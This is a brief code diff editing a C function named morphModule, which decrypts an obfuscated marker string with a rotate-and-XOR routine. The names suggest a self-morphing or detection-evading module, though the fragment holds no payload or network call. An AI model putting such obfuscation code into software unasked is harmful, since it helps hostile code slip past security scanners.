@@ -21,8 +21,11 @@ INT morphModule() {
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_MARKER_MASK;
 
-    unsigned char MARKER_MASK[MARKER_SIZE];
-    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, MARKER_MASK, (char *)s_xk, sizeof(s_xk));
+    unsigned char MARKER_MASK[MARKER_SIZE] = {0};
+
+    ROL_AND_DECRYPT((char *)s_string, sizeof(s_string), 1, MARKER_MASK, s_xk);
+
+
 
 #else
     //char * MARKER_MASK = S_MARKER_MASK;
